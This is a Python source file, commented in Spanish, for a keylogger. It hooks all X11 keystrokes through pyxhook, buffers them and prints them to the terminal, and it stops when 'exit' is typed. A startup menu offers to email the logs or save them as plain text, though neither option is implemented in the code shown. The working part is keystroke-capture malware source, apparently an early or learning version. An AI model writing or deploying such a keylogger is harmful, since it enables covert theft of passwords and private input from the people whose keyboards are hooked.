import pyxhook
import time
import sys
import termios

class Keyloggerore:
    def __init__(self):
        self.buffer = "" # Registro de pulsaciones
        self.running = True

    ### Funcion (MODIFICADA) de https://github.com/JeffHoogland/pyxhook/blob/master/example.py
    # This function is called every time a key is presssed
    def callback(self,event):
        global running, buffers
        
        if hasattr(event, 'Key'): # se toma event.Key (los otros son: event.KeyID, event.Ascii)
            self.buffer += event.Key
            
        # print key info
        print(" => Evento: " + event.Key) # ELIMINAR DESPUES
        print("BUFFER: \n" + self.buffer + "\n")

        # If the "string" value matches spacebar, terminate the while loop
        if "exit" in self.buffer.lower():
    
            print("\n[x] Se detecto 'exit'. Finalizando keylogger.")
            termios.tcflush(sys.stdin, termios.TCIFLUSH) # Limpiar terminal
            # Mientras se ejecuta el programa tambien se registran las 
            # pulsaciones en la misma terminal, las cuales forman una cola 
            # de teclas que esperan su turno para ser procesadas
            running = False
            self.buffer = ""
            
                    
def mostrar_menu():
    enviar_correo = False
    guardar_texto_plano = False
    
    print("============= Configuracion del keylogger. =============")
    print("Instrucciones: Responde 'yes'/'y' para SI, 'no'/'n' para NO, o 'exit' para salir")
    print()
        
    while True:
        print("¿Deseas enviar los registros por email?")
        opcion_correo = input("Respuesta: ").strip().lower()
        if opcion_correo == 'exit':
            print("\n[x] Saliendo del programa.")
            sys.exit(0)
        elif opcion_correo in ['yes', 'y']:
            enviar_correo = True
            print("Envío por email: ACTIVADO")
            break
        elif opcion_correo in ['no', 'n']:
            enviar_correo = False
            print("Envío por email: DESACTIVADO")
            break
        else:
            print("Respuesta inválida. Por favor ingresa: yes, y, no, n, o exit\n")
        
    print()
        
    while True:
        print("¿Deseas guardar los registros en texto plano?")
        opcion_texto = input("Respuesta: ").strip().lower()
        
        if opcion_texto == 'exit':
            print("\n[x] Saliendo del programa...")
            sys.exit(0)
        elif opcion_texto in ['yes', 'y']:
            guardar_texto_plano = True
            print("Guardado en texto plano: ACTIVADO")
            break
        elif opcion_texto in ['no', 'n']:
            guardar_texto_plano = False
            print("Guardado en texto plano: DESACTIVADO")
            break
        else:
            print("Respuesta inválida. Por favor ingresa: yes, y, no, n, o exit\n")
        
    print()
        
    return enviar_correo, guardar_texto_plano
        
if __name__ == "__main__":

    enviar_correo, guardar_local = mostrar_menu()
    
    print("============= Keylogger iniciado. =============")
    
    logger = Keyloggerore()
    
    try:
        ### codigo tomado de https://github.com/JeffHoogland/pyxhook/blob/master/example.py
        # Create hookmanager
        hookman = pyxhook.HookManager()
        # Define our callback to fire when a key is pressed down
        hookman.KeyDown = logger.callback
        # Hook the keyboard
        hookman.HookKeyboard()
        # Start our listener
        hookman.start()

        # Create a loop to keep the application running
        running = True
        while running:
            time.sleep(0.1)
            
    except KeyboardInterrupt:
        print("\n[x] Programa interrumpido por Ctrl+C.")
        running = False
        buffer = ""

    # Close the listener when we are done
    hookman.cancel()
    ### fin de example.py
    
    print("============= Keylogger detenido. =============")

